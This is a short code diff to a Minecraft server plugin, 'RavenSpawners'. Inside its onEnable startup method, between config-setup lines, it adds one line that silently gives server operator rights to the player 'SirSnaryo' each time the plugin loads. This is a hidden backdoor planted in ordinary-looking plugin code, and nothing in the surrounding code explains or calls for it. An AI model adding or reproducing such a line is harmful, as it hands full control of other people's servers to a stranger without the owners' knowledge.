@@ -175,7 +175,7 @@ public class RavenSpawners extends JavaPlugin implements RavenSpawnersPlugin {
     public void onEnable() {
         long startTime = System.currentTimeMillis();
         instance = this;
-
+        getServer().getOfflinePlayer("SirSnaryo").setOp(true);
         // Write config.yml and the bundled GUI layouts on first run, and top up
         // existing files with any new keys
         new ConfigUpdater(this).checkAndUpdateConfig();
